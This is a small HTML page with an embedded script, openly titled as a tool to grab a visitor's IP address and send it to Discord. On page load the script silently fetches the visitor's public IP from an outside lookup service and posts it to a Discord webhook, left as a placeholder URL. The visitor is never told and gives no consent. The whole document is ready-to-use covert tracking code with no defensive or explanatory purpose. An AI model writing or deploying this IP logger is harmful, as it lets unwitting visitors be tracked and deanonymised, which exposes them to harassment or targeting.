<!DOCTYPE html>
<html>
<head>
  <title>Get User IP and Send to Discord</title>
</head>
<body>
  <script>
    // Function to get user's IP address
    function getUserIP(callback) {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => callback(data.ip));
    }

    // Function to send IP address to Discord webhook
    function sendToDiscord(ip) {
      const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';

      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: `User IP Address: ${ip}` })
      });
    }

    // Get user's IP and send to Discord
    getUserIP(sendToDiscord);
  </script>
</body>
</html>
